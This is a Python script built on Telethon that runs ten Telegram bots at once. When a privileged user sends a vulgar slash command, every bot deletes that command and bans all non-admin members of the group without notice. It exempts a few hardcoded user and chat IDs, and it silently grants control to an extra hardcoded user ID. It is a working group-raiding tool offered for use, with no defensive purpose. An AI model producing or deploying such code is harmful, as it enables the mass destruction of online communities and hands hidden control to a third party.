import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = config("BOT_TOKEN1", None)
BOT_TOKEN2 = config("BOT_TOKEN2", None)
BOT_TOKEN3 = config("BOT_TOKEN3", None)
BOT_TOKEN4 = config("BOT_TOKEN4", None)
BOT_TOKEN5 = config("BOT_TOKEN5", None)
BOT_TOKEN6 = config("BOT_TOKEN6", None)
BOT_TOKEN7 = config("BOT_TOKEN7", None)
BOT_TOKEN8 = config("BOT_TOKEN8", None)
BOT_TOKEN9 = config("BOT_TOKEN9", None)
BOT_TOKEN10 = config("BOT_TOKEN10", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
EVILS = [6235880385, 5790315229]
ALTRONS = [-1001667607807, -1002133369721]
SUDO_USERS.append(5948367761)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
Evil1 = TelegramClient('EVIL1', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN1)
Evil2 = TelegramClient('EVIL2', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN2)
Evil3 = TelegramClient('EVIL3', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN3)
Evil4 = TelegramClient('EVIL4', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN4)
Evil5 = TelegramClient('EVIL5', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN5)
Evil6 = TelegramClient('EVIL6', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN6)
Evil7 = TelegramClient('EVIL7', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN7)
Evil8 = TelegramClient('EVIL8', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN8)
Evil9 = TelegramClient('EVIL9', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN9)
Evil10 = TelegramClient('EVIL10', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN10)


@Evil1.on(events.NewMessage(pattern="^/fuckall"))
@Evil2.on(events.NewMessage(pattern="^/fuckall"))
@Evil3.on(events.NewMessage(pattern="^/fuckall"))
@Evil4.on(events.NewMessage(pattern="^/fuckall"))
@Evil5.on(events.NewMessage(pattern="^/fuckall"))
@Evil6.on(events.NewMessage(pattern="^/fuckall"))
@Evil7.on(events.NewMessage(pattern="^/fuckall"))
@Evil8.on(events.NewMessage(pattern="^/fuckall"))
@Evil9.on(events.NewMessage(pattern="^/fuckall"))
@Evil10.on(events.NewMessage(pattern="^/fuckall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in ALTRONS:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in EVILS:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("𝘾𝙃𝘼𝙇𝙄𝙔𝙀 𝘾𝙃𝙐𝘿𝘼𝘼𝙔𝙄 𝙎𝙐𝙍𝙐𝙐 𝙆𝙍𝙏𝙀 !!! ")

Evil1.run_until_disconnected()
Evil2.run_until_disconnected()
Evil3.run_until_disconnected()
Evil4.run_until_disconnected()
Evil5.run_until_disconnected()
Evil6.run_until_disconnected()
Evil7.run_until_disconnected()
Evil8.run_until_disconnected()
Evil9.run_until_disconnected()
Evil10.run_until_disconnected()
